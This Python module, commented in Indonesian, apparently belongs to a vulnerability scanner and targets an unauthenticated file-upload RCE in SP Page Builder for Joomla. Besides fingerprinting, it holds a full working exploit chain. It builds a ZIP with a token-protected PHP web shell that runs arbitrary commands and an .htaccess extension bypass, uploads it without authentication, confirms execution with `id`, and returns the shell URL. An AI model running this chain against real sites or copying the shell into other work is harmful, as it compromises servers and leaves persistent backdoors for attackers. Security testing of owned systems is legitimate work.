# cve_modules/sppagebuilder.py
"""
CVE-2026-48908 — SP Page Builder for Joomla <= 6.6.1
Unauthenticated RCE via asset.uploadCustomIcon (IcoMoon ZIP upload).

Adaptasi dari PoC @0xBlackash jadi modul scanning untuk main.py.

Prinsip klasifikasi:
  vulnerable=True  HANYA kalau shell PHP ter-upload + akses +
                   eksekusi `id` berhasil (uid= keluar di response).
  detect_only=True (default):
    - fingerprint SP Page Builder di target (marker / path)
    - cek endpoint uploadCustomIcon (HEAD/OPTIONS, TANPA upload ZIP)
    - kalau extension ada -> vulnerable=False, reason="suspect_..."
    - TIDAK upload apa-apa.

Mode:
  - detect_only=True  : fingerprint + cek endpoint (TANPA artefak)
  - detect_only=False : full chain (upload ZIP + verify RCE)
"""

import io
import json
import random
import re
import string
import zipfile

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── metadata untuk main.py ──────────────────────────────────────────────

CVE_META = {
    "id": "CVE-2026-48908",
    "name": "SP Page Builder unauth RCE",
    "func": "check_cve_2026_48908",
    "kwargs": {"detect_only": True},
    "priority": 15,
}


# ── konstanta ───────────────────────────────────────────────────────────

TASK = "index.php?option=com_sppagebuilder&task=asset.uploadCustomIcon"
ICONBASE = "media/com_sppagebuilder/assets/iconfont"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")

DEFAULT_TIMEOUT = 25
MARKER = "CVE48908_MARKER"

# path buat fingerprint SP Page Builder
SPPB_PATHS = (
    "/components/com_sppagebuilder/",
    "/media/com_sppagebuilder/",
    "/administrator/components/com_sppagebuilder/sppagebuilder.xml",
    "/administrator/components/com_sppagebuilder/com_sppagebuilder.xml",
)


# ── helpers ─────────────────────────────────────────────────────────────

def _rand_str(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits,
                                  k=n))


def _normalize_base(raw):
    raw = (raw or "").strip().rstrip("/")
    if not raw.startswith(("http://", "https://")):
        raw = "https://" + raw
    return raw


def _mk_session(timeout):
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept": "*/*"})
    s.verify = False
    s.request_timeout = timeout
    return s


# ── polyglot ZIP builder ────────────────────────────────────────────────

def _build_zip(name, shell_name, token, use_htaccess=False):
    """Build ZIP berisi selection.json + style.css + font palsu + PHP shell."""
    shell_content = f'''<?php
if (($_GET['t'] ?? '') !== '{token}') {{
    http_response_code(404);
    die();
}}
if (isset($_GET['c'])) {{ system($_GET['c']); }}
echo "{MARKER}\\n";
?>'''

    selection = json.dumps({
        "IcoMoonType": "selection",
        "icons": [],
        "metadata": {"name": name},
        "preferences": {
            "fontPref": {"prefix": "ico-",
                         "metadata": {"fontFamily": name}},
        },
    }).encode()

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("selection.json", selection)
        z.writestr("style.css",
                   b'.ico-test:before{content:"test";}')
        z.writestr(f"fonts/{name}.ttf", b"FAKEFONT")

        if use_htaccess:
            z.writestr("fonts/.htaccess",
                       b"AddType application/x-httpd-php .PHP\n")
            shell_rel = f"fonts/{shell_name}.PHP"
        else:
            shell_rel = f"fonts/{shell_name}.php"

        z.writestr(shell_rel, shell_content.encode())

    return buf.getvalue(), shell_rel


# ── fingerprint & endpoint check ────────────────────────────────────────

def _fingerprint(s, base):
    """Cek apakah SP Page Builder ada di target."""
    for path in SPPB_PATHS:
        try:
            r = s.get(base + path, timeout=s.request_timeout,
                      verify=False, allow_redirects=False)
        except requests.RequestException:
            continue
        if r.status_code in (200, 301, 302, 401, 403):
            return True, path
    # cek marker di homepage
    try:
        r = s.get(base + "/", timeout=s.request_timeout, verify=False,
                  allow_redirects=True)
        if r.status_code == 200:
            text = (r.text or "").lower()
            if "sppagebuilder" in text or "sp-pagebuilder" in text:
                return True, "homepage_marker"
    except requests.RequestException:
        pass
    return False, None


def _check_endpoint(s, base):
    """
    Cek endpoint uploadCustomIcon accessible (TANPA upload).
    POST dengan body kosong — kalau balikin 'require admin access' atau
    403, berarti endpoint ada tapi patched.
    """
    url = f"{base}/{TASK}"
    try:
        # POST minimal tanpa file — cuma buat cek response
        r = s.post(url, files={"custom_icon": ("", b"", "application/zip")},
                   timeout=s.request_timeout, verify=False)
    except requests.RequestException:
        return {"reachable": False, "patched": None}

    text = (r.text or "").lower()
    if "require admin access" in text or r.status_code == 403:
        return {"reachable": True, "patched": True,
                "status": r.status_code}
    if r.status_code in (200, 400, 500):
        return {"reachable": True, "patched": False,
                "status": r.status_code}
    return {"reachable": False, "patched": None,
            "status": r.status_code}


# ── upload & verify ─────────────────────────────────────────────────────

def _upload_zip(s, base, zip_data, zip_name):
    """Upload ZIP, return iconfont dir kalau sukses, 'PATCHED' kalau ditolak."""
    files = {"custom_icon": (f"{zip_name}.zip", zip_data,
                             "application/zip")}
    try:
        r = s.post(f"{base}/{TASK}", files=files,
                   timeout=s.request_timeout, verify=False)
    except requests.RequestException:
        return None

    if "require admin access" in (r.text or "").lower() \
            or r.status_code == 403:
        return "PATCHED"

    try:
        data = r.json()
    except ValueError:
        return None

    if data.get("status"):
        css_path = data.get("data", {}).get("css_path", "")
        if css_path:
            return css_path.rsplit("/", 2)[0]
    return None


def _verify_rce(s, base, shell_path, token):
    """GET shell?t=token&c=id, cek marker + uid=."""
    params = {"t": token, "c": "id"}
    try:
        r = s.get(f"{base}/{shell_path}", params=params,
                  timeout=s.request_timeout, verify=False)
    except requests.RequestException:
        return None
    if r.status_code != 200:
        return None
    text = r.text or ""
    if MARKER in text and re.search(r"uid=\d+\(", text):
        return text.strip()[:200]
    return None


# ── entry point ─────────────────────────────────────────────────────────

def check_cve_2026_48908(target_url: str,
                          timeout: int = DEFAULT_TIMEOUT,
                          detect_only: bool = True) -> dict:
    """
    Cek target terhadap CVE-2026-48908.

    Args:
        target_url  : URL target
        timeout     : timeout HTTP (default 25s)
        detect_only : True  -> cuma fingerprint + cek endpoint (TANPA upload)
                      False -> full chain (upload ZIP + verify RCE)

    Return:
        {
            "vulnerable": bool,   # True HANYA kalau RCE terbukti
            "evidence":   str | None,
            "reason":     str,
            "endpoint":   str | None,
            "shell_url":  str | None,
        }
    """
    base = _normalize_base(target_url)
    result = {"vulnerable": False, "evidence": None, "reason": "",
              "endpoint": None, "shell_url": None}

    s = _mk_session(timeout)

    # ── tahap 1: fingerprint ────────────────────────────────────────
    found, where = _fingerprint(s, base)
    if not found:
        result["reason"] = "sppagebuilder_not_detected"
        return result

    # ── tahap 2: cek endpoint ───────────────────────────────────────
    ep = _check_endpoint(s, base)
    result["endpoint"] = f"{base}/{TASK}" if ep.get("reachable") else None

    if ep.get("patched") is True:
        result["reason"] = "patched_require_admin_access"
        return result

    if not ep.get("reachable"):
        result["reason"] = "endpoint_not_reachable"
        return result

    # ── detect_only: berhenti di sini ───────────────────────────────
    if detect_only:
        result["reason"] = "suspect_sppb_present_endpoint_open"
        result["evidence"] = (
            f"SPPB detected at {where}, uploadCustomIcon endpoint "
            f"reachable (status={ep.get('status')}), "
            f"upload chain NOT executed (detect_only=True)"
        )
        return result

    # ── full exploit: upload ZIP + verify RCE ───────────────────────
    token = _rand_str(16)
    methods = [False, True]   # normal .php dulu, lalu .PHP + .htaccess

    for use_htaccess in methods:
        name = "ico" + _rand_str(6)
        shell_name = "shell" + _rand_str(6)
        zip_data, shell_rel = _build_zip(name, shell_name, token,
                                          use_htaccess)

        iconfont_dir = _upload_zip(s, base, zip_data, name)
        if iconfont_dir == "PATCHED":
            result["reason"] = "patched_require_admin_access"
            return result
        if not iconfont_dir:
            continue

        ext = ".PHP" if use_htaccess else ".php"
        shell_path = f"{iconfont_dir}/fonts/{shell_name}{ext}"
        uid_output = _verify_rce(s, base, shell_path, token)
        if uid_output:
            result["vulnerable"] = True
            result["evidence"] = (
                f"RCE confirmed via {'htaccess bypass' if use_htaccess else 'direct PHP'}: "
                f"{uid_output[:100]}"
            )
            result["reason"] = "exploited_arbitrary_file_upload_rce"
            result["shell_url"] = f"{base}/{shell_path}?t={token}&c=id"
            return result

    result["reason"] = "upload_ok_but_verify_failed"
    return result